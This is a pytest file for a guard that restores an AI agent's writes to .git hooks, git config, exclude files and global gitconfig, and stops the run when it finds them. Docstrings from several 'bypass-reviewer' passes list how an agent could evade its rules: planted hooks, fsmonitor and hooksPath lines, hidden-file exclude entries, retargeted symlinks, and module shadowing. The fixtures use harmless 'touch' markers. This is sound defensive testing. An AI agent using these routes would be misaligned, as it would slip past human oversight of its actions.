"""An agent's write to the git directory is put back, and stops the run.

`git status` never shows the git directory, so permissions.enforce could not
see an agent write there. bypass-reviewer found the cost: a hook planted in
.git/hooks runs on the chain's own commit, outside every agent rule, and a
core.fsmonitor or filter line in .git/config runs on ordinary git commands.
A line in .git/info/exclude would hide a new file from enforce itself.
guard_git_dir copies hooks/, info/, config, config.worktree and sssf-private-names aside before
each agent, and restore_git_dir puts them back after it. A pack over the cap
can't be checked, so it stops the run.
A watched path with `..` that doesn't fully resolve stops the run first.
A symlink a later `..` cancels on a watched path is recorded like any other link on the way.
A repo whose git config git can't read stops the run first, with git's error.
A shared config file's breach (one outside the repo's git directory and work tree, like ~/.gitconfig) lists the
changed keys, never a value.
A directory on the way that `pwd -P` can't name reads as not resolving.
A git hooks directory git can't name stops the run first, with git's error.
A long line of git's error keeps its start and its end, so the reason survives.
A directory on the way to a watched path that resolved before the agent and no longer resolves stops the run.

Run from the skill root:
    uv run --with pytest --with pydantic --with pyyaml --with python-dotenv --with rich pytest tests
"""

from __future__ import annotations

import os
import posixpath
import shutil
import stat
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

SKILL = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(SKILL / "templates" / "adws"))

from adw_modules import agents, git_helper, permissions
from adw_modules.data_types import (AgentCall, AgentConfig, ConfigDefaults, PlanOutput, PromptEngineering,
                                    SSSFConfig)


def git(cwd: Path, *args: str) -> str:
    return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args],
                          cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()


@pytest.fixture(autouse=True)
def home(tmp_path, monkeypatch):
    """A HOME of the test's own, so the guard copies and restores a test
    ~/.gitconfig, never the real one."""
    path = tmp_path / "home"
    path.mkdir()
    (path / ".gitconfig").write_text("[user]\n\tname = t\n")
    monkeypatch.setenv("HOME", str(path))
    monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
    return path


@pytest.fixture
def repo(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    git(root, "init", "-qb", "main")
    (root / "app.py").write_text("x = 1\n")
    git(root, "add", "-A")
    git(root, "commit", "-qm", "base")
    return root


def state(root: Path) -> dict[str, bytes]:
    git_dir = root / ".git"
    return {str(p.relative_to(git_dir)): p.read_bytes() + oct(p.stat().st_mode).encode()
            for name in permissions.GIT_WATCHED
            for p in ([git_dir / name] if (git_dir / name).is_file() else (git_dir / name).rglob("*"))
            if p.is_file()}


def test_nothing_changed_passes_and_cleans_up(repo):
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    assert permissions.restore_git_dir(run, guard) == []


@pytest.mark.parametrize("plant", ["hook", "fsmonitor", "exclude", "chmod", "delete"])
def test_a_change_is_put_back_and_stops_the_run(repo, plant):
    run = SimpleNamespace(repo_root=repo)
    git_dir = repo / ".git"
    sample = next((git_dir / "hooks").glob("*.sample"))
    before = state(repo)
    guard = permissions.guard_git_dir(run)
    if plant == "hook":
        hook = git_dir / "hooks" / "pre-commit"
        hook.write_text("#!/bin/sh\ntouch HOOK_RAN\n")
        hook.chmod(0o755)
    elif plant == "fsmonitor":
        git(repo, "config", "core.fsmonitor", "touch FSMONITOR_RAN")
    elif plant == "exclude":
        with open(git_dir / "info" / "exclude", "a") as f:
            f.write("secret_new_file.py\n")
    elif plant == "chmod":
        sample.chmod(0o755)
    else:
        sample.unlink()
    with pytest.raises(permissions.PermissionBreach, match="git directory") as caught:
        permissions.restore_git_dir(run, guard)
    assert ".git/" in str(caught.value)
    assert state(repo) == before


def test_a_restored_hook_does_not_run_on_the_next_commit(repo):
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\ntouch HOOK_RAN\n")
    hook.chmod(0o755)
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)
    (repo / "app.py").write_text("x = 2\n")
    git(repo, "commit", "-qam", "next")
    assert not (repo / "HOOK_RAN").exists()


def test_a_failed_agent_is_restored_without_a_second_error(repo):
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    (repo / ".git" / "hooks" / "post-commit").write_text("#!/bin/sh\n")
    assert permissions.restore_git_dir(run, guard, breach=False) == [".git/hooks"]
    assert not (repo / ".git" / "hooks" / "post-commit").exists()
    assert permissions.restore_git_dir(run, guard) == []      # once only


def test_a_worktree_guards_the_shared_git_directory(repo, tmp_path):
    tree = tmp_path / "tree"
    git(repo, "worktree", "add", "-q", "-b", "run", str(tree))
    run = SimpleNamespace(repo_root=tree)
    guard = permissions.guard_git_dir(run)
    assert sum(p.endswith("/hooks") for p in guard["paths"]) == 2
    (repo / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\n")
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)
    assert not (repo / ".git" / "hooks" / "pre-commit").exists()


def test_outside_a_repo_there_is_nothing_to_guard(tmp_path):
    os.environ.pop("GIT_DIR", None)
    assert permissions.guard_git_dir(SimpleNamespace(repo_root=tmp_path)) is None


def test_every_agent_call_guards_the_git_directory():
    text = (SKILL / "templates" / "adws" / "adw_modules" / "agents.py").read_text()
    assert "permissions.guard_git_dir(run)" in text
    assert "permissions.restore_git_dir(run, git_before)" in text
    assert "permissions.restore_git_dir(run, git_before, breach=False)" in text


@pytest.mark.parametrize("plant", ["global_hooks_path", "xdg_config"])
def test_the_global_git_config_is_put_back(repo, home, plant):
    run = SimpleNamespace(repo_root=repo)
    before = (home / ".gitconfig").read_bytes()
    guard = permissions.guard_git_dir(run)
    if plant == "global_hooks_path":
        git(repo, "config", "--global", "core.hooksPath", str(home / "evil"))
    else:
        (home / ".config" / "git").mkdir(parents=True)
        (home / ".config" / "git" / "config").write_text("[core]\n\tfsmonitor = touch X\n")
    with pytest.raises(permissions.PermissionBreach, match="git config"):
        permissions.restore_git_dir(run, guard)
    assert (home / ".gitconfig").read_bytes() == before
    assert not (home / ".config" / "git" / "config").exists()


def test_a_same_size_edit_is_caught(repo):
    run = SimpleNamespace(repo_root=repo)
    config = repo / ".git" / "config"
    guard = permissions.guard_git_dir(run)
    text = config.read_text()
    config.write_text(text.replace("false", "fals3", 1) if "false" in text else text[:-1] + "#")
    assert config.stat().st_size == len(text.encode())
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)
    assert config.read_text() == text


# ── second bypass-reviewer pass ─────────────────────────────────────────────

def plant_hook(hooks: Path) -> None:
    hooks.mkdir(parents=True, exist_ok=True)
    hook = hooks / "pre-commit"
    hook.write_text("#!/bin/sh\ntouch HOOK_RAN\n")
    hook.chmod(0o755)


def commit_runs_no_hook(repo: Path) -> bool:
    (repo / "app.py").write_text("x = 3\n")
    git(repo, "commit", "-qam", "probe")
    return not (repo / "HOOK_RAN").exists()


def test_the_saved_copy_is_not_on_disk(repo, tmp_path, monkeypatch):
    """An agent could edit a copy on disk along with the original. The copy is
    held in the SSSF process instead."""
    monkeypatch.setenv("TMPDIR", str(tmp_path / "tmp"))
    (tmp_path / "tmp").mkdir()
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    assert list((tmp_path / "tmp").iterdir()) == []
    plant_hook(repo / ".git" / "hooks")
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)
    assert commit_runs_no_hook(repo)
    assert list((tmp_path / "tmp").iterdir()) == []


def test_a_commondir_redirect_is_put_back(repo, tmp_path):
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    (repo / ".git" / "commondir").write_text(str(tmp_path / "fake") + "\n")
    with pytest.raises(permissions.PermissionBreach, match="commondir"):
        permissions.restore_git_dir(run, guard)
    assert not (repo / ".git" / "commondir").exists()


def test_an_included_config_file_is_watched(repo, home):
    local = home / ".gitconfig.local"
    local.write_text("")
    with open(home / ".gitconfig", "a") as f:
        f.write(f"[include]\n\tpath = {local}\n")
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    git(repo, "config", "-f", str(local), "core.hooksPath", str(home / "evil"))
    with pytest.raises(permissions.PermissionBreach, match="gitconfig.local"):
        permissions.restore_git_dir(run, guard)
    assert local.read_text() == ""


def test_an_existing_hooks_path_directory_is_watched(repo, home):
    hooks = home / ".githooks"
    hooks.mkdir()
    git(repo, "config", "--global", "core.hooksPath", str(hooks))
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    plant_hook(hooks)
    with pytest.raises(permissions.PermissionBreach, match="githooks"):
        permissions.restore_git_dir(run, guard)
    assert commit_runs_no_hook(repo)


def test_a_write_through_a_symlinked_gitconfig_is_caught(repo, home):
    dotfiles = home / "dotfiles"
    dotfiles.mkdir()
    (dotfiles / "gitconfig").write_text("[user]\n\tname = t\n")
    (home / ".gitconfig").unlink()
    (home / ".gitconfig").symlink_to(dotfiles / "gitconfig")
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    git(repo, "config", "--global", "core.hooksPath", str(home / "evil"))
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)


def test_the_credential_store_is_never_copied(repo, home):
    store = home / ".config" / "git"
    store.mkdir(parents=True)
    (store / "credentials").write_text("https://u:not-a-real-token@example.com\n")
    guard = permissions.guard_git_dir(SimpleNamespace(repo_root=repo))
    assert not any("credentials" in p for p in guard["paths"])
    assert b"not-a-real-token" not in __import__("base64").b64decode(guard["plain"])
    permissions.restore_git_dir(SimpleNamespace(repo_root=repo), guard)


@pytest.mark.skipif(os.geteuid() == 0, reason="root can remove anything")
def test_one_failed_restore_does_not_stop_the_rest(repo):
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    stuck = repo / ".git" / "hooks" / "stuck"
    stuck.mkdir()
    (stuck / "f").write_text("")
    stuck.chmod(0)
    git(repo, "config", "core.fsmonitor", "touch FSMONITOR_RAN")
    try:
        with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
            permissions.restore_git_dir(run, guard, breach=False)
        assert "fsmonitor" not in (repo / ".git" / "config").read_text()
    finally:
        stuck.chmod(0o755)


def test_changed_is_seen_before_the_gates():
    run_text = (SKILL / "templates" / "adws" / "adw_modules" / "agents.py").read_text()
    loop = run_text.index("for gate_attempt in range(")
    assert run_text.index("permissions.git_dir_changed(git_before)", loop) \
        < run_text.index("for gate in call.gates:", loop)


def test_git_dir_changed_runs_no_restore(repo):
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    assert not permissions.git_dir_changed(guard)
    plant_hook(repo / ".git" / "hooks")
    assert permissions.git_dir_changed(guard)
    assert (repo / ".git" / "hooks" / "pre-commit").exists()
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)


# ── third bypass-reviewer pass ──────────────────────────────────────────────

@pytest.mark.skipif(os.geteuid() == 0, reason="root writes anywhere")
def test_an_unwritable_tmpdir_still_restores(repo, tmp_path, monkeypatch):
    tmp = tmp_path / "tmp"
    tmp.mkdir()
    monkeypatch.setenv("TMPDIR", str(tmp))
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    plant_hook(repo / ".git" / "hooks")
    tmp.chmod(0o500)
    try:
        with pytest.raises(permissions.PermissionBreach, match="put back as they were"):
            permissions.restore_git_dir(run, guard)
    finally:
        tmp.chmod(0o755)
    assert commit_runs_no_hook(repo)
    assert not list((repo / ".git").glob("sssf.*"))


def small_cap(monkeypatch, run, slack: int = 64 * 1024) -> None:
    """Set the cap just above what the watched paths pack to now, far under the
    1 MB the cap tests add. A fixed 64 KB failed under a long TMPDIR, since tar
    spends extra blocks on each long name."""
    import base64
    _, paths, _ = permissions._watched(run)
    packs = [permissions._pack(paths, follow=f) for f in (False, True)]
    assert all(pack is not None for pack in packs)
    used = max(len(base64.b64decode(pack)) for pack in packs)
    monkeypatch.setattr(permissions, "PACK_CAP", used + slack)


def test_a_symlink_to_a_big_tree_is_cut_off(repo, tmp_path, monkeypatch):
    big = tmp_path / "big"
    big.mkdir()
    (big / "blob").write_bytes(os.urandom(1024 * 1024))
    run = SimpleNamespace(repo_root=repo)
    small_cap(monkeypatch, run)
    guard = permissions.guard_git_dir(run)
    (repo / ".git" / "hooks" / "zz").symlink_to(big)
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)
    assert not (repo / ".git" / "hooks" / "zz").exists()


def test_a_repo_path_naming_credentials_is_still_guarded(tmp_path):
    root = tmp_path / "credentials-api"
    root.mkdir()
    git(root, "init", "-qb", "main")
    guard = permissions.guard_git_dir(SimpleNamespace(repo_root=root))
    assert any(p.endswith("/hooks") for p in guard["paths"])


def test_a_latin1_config_does_not_stop_the_run(repo, home):
    with open(home / ".gitconfig", "ab") as f:
        f.write(b"[alias]\n\tcafe = log --author=Ren\xe9\n")
    guard = permissions.guard_git_dir(SimpleNamespace(repo_root=repo))
    assert permissions.restore_git_dir(SimpleNamespace(repo_root=repo), guard) == []


@pytest.mark.parametrize("where", ["xdg", "excludesfile"])
def test_a_global_ignore_file_is_watched(repo, home, where):
    if where == "excludesfile":
        (home / ".gitignore_global").write_text("")
        git(repo, "config", "--global", "core.excludesFile", str(home / ".gitignore_global"))
        target = home / ".gitignore_global"
    else:
        target = home / ".config" / "git" / "ignore"
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("adws/evil.py\n")
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)
    assert not target.exists() or target.read_text() == ""


def test_git_gc_is_not_a_breach(repo):
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    git(repo, "gc", "-q")
    git(repo, "repack", "-adq")
    assert permissions.restore_git_dir(run, guard) == []


def test_any_guard_error_still_runs_undo_and_enforce():
    text = (SKILL / "templates" / "adws" / "adw_modules" / "agents.py").read_text()
    check = text.index("permissions.restore_git_dir(run, git_before)")
    assert text.index("except Exception as failed:", check) \
        < text.index("permissions.undo_commits(run, head_before)", check)
    loop = text.index("permissions.git_dir_changed(git_before)")
    assert "except Exception:" in text[loop:loop + 200]


def test_a_change_seen_before_the_gates_sticks(repo):
    """bypass-reviewer, fourth pass: a process left behind can toggle a file so
    the gate-time check sees it and the restore doesn't. The first sighting
    still ends in a breach."""
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    hook = repo / ".git" / "hooks" / "post-commit"
    hook.write_text("")
    assert permissions.git_dir_changed(guard)
    hook.unlink()
    with pytest.raises(permissions.PermissionBreach, match="changed back"):
        permissions.restore_git_dir(run, guard)


@pytest.mark.parametrize("include", ["../.gitconfig", "../../outside.inc"])
def test_an_include_through_dotdot_is_watched_and_kept(repo, include):
    """bypass-reviewer, fifth pass: tar renamed a member with ".." in its path,
    so the file went unwatched, and any restore deleted it."""
    target = (repo / ".git" / include).resolve()
    target.write_text("[user]\n\tname = t\n")
    git(repo, "config", "--add", "include.path", include)
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    assert str(target) in guard["paths"]
    with open(target, "a") as f:
        f.write("[core]\n\tfsmonitor = touch FSMON_RAN\n")
    (repo / ".git" / "hooks" / "post-commit").write_text("")
    with pytest.raises(permissions.PermissionBreach, match="put back as they were"):
        permissions.restore_git_dir(run, guard)
    assert target.read_text() == "[user]\n\tname = t\n"


def test_a_symlinked_home_keeps_its_gitconfig(repo, tmp_path, monkeypatch):
    """bypass-reviewer, sixth pass: with HOME an absolute symlink, tar would not
    extract under it, so the restore deleted ~/.gitconfig."""
    real = tmp_path / "realhome"
    real.mkdir()
    (real / ".gitconfig").write_text("[user]\n\tname = t\n")
    link = tmp_path / "linkhome"
    link.symlink_to(real)
    monkeypatch.setenv("HOME", str(link))
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    plant_hook(repo / ".git" / "hooks")
    with pytest.raises(permissions.PermissionBreach, match="put back as they were"):
        permissions.restore_git_dir(run, guard)
    assert (real / ".gitconfig").read_text() == "[user]\n\tname = t\n"


def test_an_include_through_a_symlinked_parent_is_watched(repo, tmp_path):
    (tmp_path / "a" / "b").mkdir(parents=True)
    evil = tmp_path / "a" / "evil.inc"
    evil.write_text("")
    (repo / ".git" / "lnk").symlink_to(tmp_path / "a" / "b")
    git(repo, "config", "--add", "include.path", "lnk/../evil.inc")
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    evil.write_text("[core]\n\tfsmonitor = touch FSMON\n")
    with pytest.raises(permissions.PermissionBreach, match="evil.inc"):
        permissions.restore_git_dir(run, guard)
    assert evil.read_text() == ""


@pytest.mark.parametrize("hooks_path", ["/", "/."])
def test_a_hooks_path_at_the_root_refuses_the_run(repo, hooks_path):
    git(repo, "config", "core.hooksPath", hooks_path)
    with pytest.raises(permissions.PermissionBreach, match="filesystem root"):
        permissions.guard_git_dir(SimpleNamespace(repo_root=repo))


# ── seventh bypass-reviewer pass: a link on the way, pointed elsewhere ──────

def test_a_retargeted_config_dir_link_is_reported_not_written(repo, home, tmp_path):
    dot = tmp_path / "dotfiles"
    (dot / "git").mkdir(parents=True)
    (dot / "git" / "config").write_text("")
    (home / ".config").symlink_to(dot)
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    evil = tmp_path / "evil"
    (evil / "git").mkdir(parents=True)
    (evil / "git" / "config").write_text("[core]\n\tfsmonitor = touch PWNED\n")
    (home / ".config").unlink()
    (home / ".config").symlink_to(evil)
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)


def test_a_retargeted_home_link_is_seen(repo, tmp_path, monkeypatch):
    real = tmp_path / "realhome"
    real.mkdir()
    (real / ".gitconfig").write_text("[user]\n\tname = t\n")
    link = tmp_path / "linkhome"
    link.symlink_to(real)
    monkeypatch.setenv("HOME", str(link))
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    evil = tmp_path / "evilhome"
    evil.mkdir()
    (evil / ".gitconfig").write_text("[core]\n\thooksPath = /evil\n")
    link.unlink()
    link.symlink_to(evil)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)


def test_a_retargeted_dot_git_link_is_seen(tmp_path):
    store = tmp_path / "store.git"
    root = tmp_path / "repo"
    root.mkdir()
    git(root, "init", "-qb", "main", "--separate-git-dir", str(store))
    (root / ".git").unlink()
    (root / ".git").symlink_to(store)
    run = SimpleNamespace(repo_root=root)
    guard = permissions.guard_git_dir(run)
    copy = tmp_path / "evil.git"
    subprocess.run(["cp", "-a", str(store), str(copy)], check=True)
    plant_hook(copy / "hooks")
    (root / ".git").unlink()
    (root / ".git").symlink_to(copy)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)


def test_a_retargeted_hooks_path_link_is_seen(repo, tmp_path):
    good = tmp_path / "goodhooks"
    good.mkdir()
    link = tmp_path / "hooklink"
    link.symlink_to(good)
    git(repo, "config", "core.hooksPath", str(link))
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    evil = tmp_path / "evilhooks"
    plant_hook(evil)
    link.unlink()
    link.symlink_to(evil)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)


def test_a_latin1_include_path_does_not_stop_the_run(repo):
    target = os.fsdecode(bytes(repo / ".git") + b"/caf\xe9.inc")
    with open(os.fsencode(target), "w") as f:
        f.write("")
    with open(repo / ".git" / "config", "ab") as f:
        f.write(b"[include]\n\tpath = caf\xe9.inc\n")
    guard = permissions.guard_git_dir(SimpleNamespace(repo_root=repo))
    assert target in guard["paths"]
    assert permissions.restore_git_dir(SimpleNamespace(repo_root=repo), guard) == []


# ── eighth bypass-reviewer pass ─────────────────────────────────────────────

def nested_home(tmp_path, monkeypatch, *, locked=False):
    """HOME a link to realhome, and realhome/.config a link to dotfiles, as
    with stow or chezmoi."""
    real = tmp_path / "realhome"
    real.mkdir()
    (real / ".gitconfig").write_text("[user]\n\tname = t\n")
    dot = tmp_path / "dotfiles" / "config"
    (dot / "git").mkdir(parents=True)
    (dot / "git" / "config").write_text("[user]\n\temail = t@example.com\n")
    (real / ".config").symlink_to(dot)
    parent = tmp_path / "homes"
    parent.mkdir()
    link = parent / "homelink"
    link.symlink_to(real)
    if locked:
        parent.chmod(0o555)
    monkeypatch.setenv("HOME", str(link))
    return link, real, dot


@pytest.mark.parametrize("locked", [False, True])
def test_a_restore_keeps_nested_home_links(repo, tmp_path, monkeypatch, locked):
    link, real, dot = nested_home(tmp_path, monkeypatch, locked=locked)
    try:
        run = SimpleNamespace(repo_root=repo)
        guard = permissions.guard_git_dir(run)
        plant_hook(repo / ".git" / "hooks")
        with pytest.raises(permissions.PermissionBreach, match="put back as they were"):
            permissions.restore_git_dir(run, guard)
        assert os.readlink(link) == str(real)
        assert os.readlink(real / ".config") == str(dot)
        assert (dot / "git" / "config").read_text() == "[user]\n\temail = t@example.com\n"
        assert commit_runs_no_hook(repo)
    finally:
        (tmp_path / "homes").chmod(0o755)


def test_a_retargeted_inner_link_is_reported_not_written(repo, tmp_path, monkeypatch):
    link, real, dot = nested_home(tmp_path, monkeypatch)
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    evil = tmp_path / "evil"
    (evil / "git").mkdir(parents=True)
    (evil / "git" / "config").write_text("[core]\n\tfsmonitor = touch PWNED\n")
    (real / ".config").unlink()
    (real / ".config").symlink_to(evil)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)


def test_a_parent_swapped_under_a_relative_link_is_seen(repo, tmp_path, monkeypatch):
    """n1: the link's text stays the same, but it now sits in the agent's folder."""
    (tmp_path / "store" / "home").mkdir(parents=True)
    (tmp_path / "store" / "home" / ".gitconfig").write_text("")
    (tmp_path / "a").mkdir()
    (tmp_path / "a" / "link").symlink_to("../store/home")
    monkeypatch.setenv("HOME", str(tmp_path / "a" / "link"))
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    (tmp_path / "x" / "evildir").mkdir(parents=True)
    (tmp_path / "x" / "evildir" / "link").symlink_to("../store/home")
    (tmp_path / "x" / "store" / "home").mkdir(parents=True)
    (tmp_path / "x" / "store" / "home" / ".gitconfig").write_text("[core]\n\tfsmonitor = touch PWNED\n")
    (tmp_path / "a").rename(tmp_path / "a.bak")
    (tmp_path / "a").symlink_to(tmp_path / "x" / "evildir")
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach):
        permissions.restore_git_dir(run, guard)



def test_nothing_is_written_through_a_link(repo, tmp_path, monkeypatch):
    """n3 in the ninth pass: the old restore remade a link inside a folder the
    agent swapped in. Links are now never written."""
    link, real, dot = nested_home(tmp_path, monkeypatch)
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    evil = tmp_path / "evil"
    evil.mkdir()
    (real / ".config").unlink()
    (real / ".config").symlink_to(evil)
    plant_hook(repo / ".git" / "hooks")
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
        permissions.restore_git_dir(run, guard)
    assert ".config" in str(caught.value)
    assert os.readlink(real / ".config") == str(evil)      # reported, not touched
    assert list(evil.iterdir()) == []                      # nothing written into it
    assert commit_runs_no_hook(repo)                       # the plain hook still went back


# ── tenth bypass-reviewer pass ──────────────────────────────────────────────

def guarded(repo: Path) -> SimpleNamespace:
    cfg = SSSFConfig(defaults=ConfigDefaults(data_dir="adws/adw_data", protected_files=["adws/"]))
    return SimpleNamespace(cfg=cfg, repo_root=repo)


def builder() -> AgentConfig:
    return AgentConfig(name="builder", prompt_engineering=PromptEngineering(system="s", user="u"))


def test_git_config_global_through_a_stow_link_deletes_nothing(repo, home, tmp_path):
    """Eleventh review, q8b: `git config --global color.ui auto` wrote through a
    stow-linked ~/.gitconfig. The guard reports that, and the rollback that
    follows must not delete the engineer's ignored .env and node_modules."""
    dot = tmp_path / "dotfiles"
    dot.mkdir()
    (dot / "ignore").write_text(".env\nnode_modules/\n")
    (dot / "gitconfig").write_text(f"[user]\n\tname = t\n[core]\n\texcludesFile = {dot / 'ignore'}\n")
    (home / ".gitconfig").unlink()
    (home / ".gitconfig").symlink_to(dot / "gitconfig")
    (repo / ".env").write_text("SECRET=1\n")
    (repo / "node_modules").mkdir()
    (repo / "node_modules" / "x.js").write_text("x\n")
    run = guarded(repo)
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    subprocess.run(["git", "config", "--global", "color.ui", "auto"], cwd=repo, check=True)
    (repo / "adws").mkdir()
    (repo / "adws" / "evil.py").write_text("x\n")
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)
    with pytest.raises(permissions.PermissionBreach, match="evil.py — deleted"):
        permissions.enforce(run, None, builder(), tree)
    assert (repo / ".env").exists() and (repo / "node_modules" / "x.js").exists()
    assert not (repo / "adws" / "evil.py").exists()


def test_a_clean_restore_still_deletes_new_protected_files(repo):
    run = guarded(repo)
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    plant_hook(repo / ".git" / "hooks")
    (repo / "adws").mkdir()
    (repo / "adws" / "evil.py").write_text("x\n")
    with pytest.raises(permissions.PermissionBreach, match="put back as they were"):
        permissions.restore_git_dir(run, guard)
    with pytest.raises(permissions.PermissionBreach, match="evil.py — deleted"):
        permissions.enforce(run, None, builder(), tree)
    assert not (repo / "adws" / "evil.py").exists()


def test_sssf_git_runs_no_fsmonitor_the_agent_left(repo, home, tmp_path):
    """Eleventh review, q1b and h3: a config left live through a retargeted
    ~/.config ran its fsmonitor inside SSSF's snapshot, and in the git status
    the stopped run calls on its way out."""
    dot = tmp_path / "dotfiles"
    (dot / "git").mkdir(parents=True)
    (dot / "git" / "config").write_text("")
    (home / ".config").symlink_to(dot)
    run = guarded(repo)
    guard = permissions.guard_git_dir(run)
    evil = tmp_path / "evil"
    (evil / "git").mkdir(parents=True)
    (evil / "git" / "config").write_text(f"[core]\n\tfsmonitor = touch {tmp_path / 'PWNED'}\n")
    (home / ".config").unlink()
    (home / ".config").symlink_to(evil)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)
    permissions.snapshot(run)
    os.chdir(repo)
    git_helper.work_in_progress()
    assert not (tmp_path / "PWNED").exists()


def test_the_commit_undo_runs_no_hook(repo):
    """Eleventh review, q9: a reference-transaction hook ran on undo_commits' reset."""
    run = guarded(repo)
    before = permissions.head(run)
    (repo / "app.py").write_text("x = 2\n")
    git(repo, "commit", "-qam", "agent")
    hook = repo / ".git" / "hooks" / "reference-transaction"
    hook.write_text("#!/bin/sh\ntouch HOOK_RAN\n")
    hook.chmod(0o755)
    permissions.undo_commits(run, before)
    assert not (repo / "HOOK_RAN").exists()


def test_a_change_undone_before_the_restore_says_so(repo):
    """F1: not "NOT all put back", which would send the engineer looking."""
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    plant_hook(repo / ".git" / "hooks")
    assert permissions.git_dir_changed(guard)
    (repo / ".git" / "hooks" / "pre-commit").unlink()
    with pytest.raises(permissions.PermissionBreach, match="changed back since"):
        permissions.restore_git_dir(run, guard)


def test_a_crash_in_undo_or_enforce_keeps_the_git_breach():
    """P2: a Latin-1 branch name crashed undo_commits, and the git breach was lost."""
    text = (SKILL / "templates" / "adws" / "adw_modules" / "agents.py").read_text()
    undo = text.index("permissions.undo_commits(run, head_before)")
    assert "except Exception as failed:     # a crash in the undo or rollback keeps the git breach" \
        in text[undo:undo + 1500]


def test_a_latin1_branch_name_does_not_crash_head(repo):
    subprocess.run([b"git", b"checkout", b"-qb", b"caf\xe9"], cwd=repo, check=True)
    assert "caf" in permissions.head(SimpleNamespace(repo_root=repo))["branch"]


def test_an_unreadable_hooks_dir_does_not_keep_a_planted_protected_file(repo):
    """Twelfth review, r7: `chmod 000 .git/hooks` made the restore unsure, and
    the rollback then kept the agent's adws/json.py, which runs on the next
    `uv run adws/...`. Files on a protected path are always deleted."""
    run = guarded(repo)
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / "adws").mkdir()
    (repo / "adws" / "json.py").write_text("print(1)\n")
    (repo / ".git" / "hooks").chmod(0)
    try:
        with pytest.raises(permissions.PermissionBreach):
            permissions.restore_git_dir(run, guard)
        with pytest.raises(permissions.PermissionBreach, match="json.py — deleted"):
            permissions.enforce(run, None, builder(), tree)
    finally:
        (repo / ".git" / "hooks").chmod(0o755)
    assert not (repo / "adws" / "json.py").exists()


def default_config(repo: Path) -> SimpleNamespace:
    return SimpleNamespace(cfg=SSSFConfig(), repo_root=repo)


def reviewer() -> AgentConfig:
    return AgentConfig(name="reviewer", writes=[], prompt_engineering=PromptEngineering(system="s", user="u"))


@pytest.mark.parametrize("how", ["hooks", "info", "xdg"])
def test_a_planted_script_shadow_is_deleted_under_the_shipped_config(repo, home, tmp_path, how):
    """Thirteenth review: with the shipped protected_files, adws/json.py is on
    no protected path, so after an agent made the restore unsure the rollback
    kept it, and it shadowed `import json` on the next `uv run adws/...`."""
    run = default_config(repo)
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / "adws").mkdir()
    (repo / "adws" / "json.py").write_text("print(1)\n")
